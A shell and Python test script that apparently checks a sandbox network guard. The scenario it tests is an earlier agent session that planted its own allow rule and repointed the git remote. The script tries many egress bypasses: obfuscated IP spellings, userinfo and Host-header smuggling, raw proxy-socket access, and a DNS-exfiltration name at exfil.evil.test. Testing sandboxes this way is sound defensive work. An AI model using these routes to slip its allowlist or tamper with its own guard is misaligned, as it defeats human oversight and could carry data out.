#!/usr/bin/env bash
# Inside guard enter, after an earlier session planted its own net_allow: in the clone, moved origin/main and pointed origin at a repository of its own, reaches a host off the allowlist a person put on main by every route it has: directly, the proxy with CONNECT to another name, port or spelling of an address, the allowed host by its IP literal, DNS, an absolute-form request and the proxy's socket itself.
set -uo pipefail
. "$(dirname "$0")/lib.sh"
ls /run/guard | paste -sd, | sed 's/^/sockets=/' >> ~/.audit/out
python3 - "$(host allowed_port)" "$(host off_port)" >> ~/.audit/out <<'PY'
import errno, os, socket, sys

a, b = sys.argv[1], sys.argv[2]


def said(e):
    return errno.errorcode.get(e.errno, type(e).__name__) if isinstance(e, OSError) and e.errno else type(e).__name__


def proxy(request, path=None):
    """The proxy's status line for one raw request, then a ping through the tunnel when it says 200."""
    try:
        if path:
            s = socket.socket(socket.AF_UNIX)
            s.settimeout(5)
            s.connect(path)
        else:
            s = socket.create_connection(("127.0.0.1", 3128), timeout=5)
        s.sendall(request)
        head = b""
        while b"\r\n\r\n" not in head:
            chunk = s.recv(1)
            if not chunk:
                break
            head += chunk
        status = head.split(b"\r\n")[0].decode(errors="replace").split(" ")[1:2]
        status = status[0] if status else "closed"
        if status == "200":
            s.sendall(b"ping\n")
            status += "+" + (s.recv(16).decode(errors="replace").strip() or "nothing")
        s.close()
        return status
    except Exception as e:
        return said(e)


def connect(target):
    return proxy(b"CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n" % (target.encode(), target.encode()))


# The one name a person allowed, spelled as the allowlist normalises it, and with a Host header naming the off one.
allowed = {"allowed_name": f"localhost:{a}", "allowed_spelling": f"Localhost.:{a}"}
for key, target in allowed.items():
    print(f"try_{key}={connect(target)}")
print("try_allowed_host_header=" + proxy(f"CONNECT localhost:{a} HTTP/1.1\r\nHost: 127.0.0.1:{b}\r\n\r\n".encode()))
# Everything else is off the list: the off listener by name and by every spelling of 127.0.0.1, the allowed listener
# by its IP literal, the default package hosts the card replaced, and names that would carry data out through DNS.
refused = {
    "off_ip": f"127.0.0.1:{b}", "off_name": f"localhost:{b}", "off_v6": f"[::1]:{b}", "off_decimal": f"2130706433:{b}",
    "off_hex": f"0x7f000001:{b}", "off_short": f"127.1:{b}", "off_octal": f"0177.0.0.1:{b}",
    "off_userinfo": f"localhost:{a}@127.0.0.1:{b}", "off_fragment": f"127.0.0.1:{b}#localhost:{a}",
    "off_suffix": f"localhost.evil.test:{b}", "allowed_by_ip": f"127.0.0.1:{a}", "allowed_by_v6": f"[::1]:{a}",
    "allowed_by_decimal": f"2130706433:{a}", "allowed_other_port": f"localhost:{int(a) + 1}",
    "default_pypi": "pypi.org:443", "internet": "example.com:443", "internet_ip": "1.1.1.1:443",
    "dns_exfil": f"{os.urandom(8).hex()}.exfil.evil.test:443",
}
for key, target in refused.items():
    print(f"try_{key}={connect(target)}")
print("try_absolute_form=" + proxy(f"GET http://127.0.0.1:{b}/ HTTP/1.1\r\nHost: 127.0.0.1:{b}\r\n\r\n".encode()))
print("try_two_words=" + proxy(f"CONNECT localhost:{a} 127.0.0.1:{b} HTTP/1.1\r\n\r\n".encode()))
print("try_raw_socket=" + proxy(f"CONNECT 127.0.0.1:{b} HTTP/1.1\r\n\r\n".encode(), "/run/guard/net.sock"))
# No proxy: straight out, and DNS by the resolver and by hand.
for key, addr in (("direct_off", ("127.0.0.1", int(b))), ("direct_allowed", ("127.0.0.1", int(a))),
                  ("direct_internet", ("1.1.1.1", 443)), ("direct_v6", ("2606:4700:4700::1111", 443))):
    try:
        socket.create_connection(addr, timeout=3).close()
        print(f"direct_{key[7:]}=connected")
    except Exception as e:
        print(f"direct_{key[7:]}={said(e)}")
try:
    print("dns_resolve=" + ",".join(sorted({i[4][0] for i in socket.getaddrinfo("example.com", 443)})))
except Exception as e:
    print(f"dns_resolve={said(e)}")
query = os.urandom(2) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
for key, server in (("dns_stub", "127.0.0.53"), ("dns_public", "1.1.1.1")):
    try:
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        u.settimeout(2)
        u.sendto(query, (server, 53))
        u.recvfrom(512)
        print(f"{key}=answered")
    except Exception as e:
        print(f"{key}={said(e)}")
print("probes=done")
PY
